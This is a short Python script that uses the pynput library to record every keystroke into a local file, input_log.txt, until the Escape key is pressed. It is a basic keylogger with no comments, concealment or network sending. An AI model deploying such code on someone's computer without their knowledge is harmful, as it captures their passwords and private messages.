from pynput.keyboard import Key, Listener

def press(Key):
    keyboard_input = str(Key).replace("'","")
    with open("input_log.txt","a") as f:
        if keyboard_input == "Key.space":
            f.write(" ")
        elif len(keyboard_input) > 1:
            f.write("\n" + keyboard_input + "\n")
        else:
            f.write(keyboard_input)

def release(Key):
    if str(Key) == "Key.esc":
        exit(0)

with Listener(on_press = press, on_release = release) as listener:
        listener.join()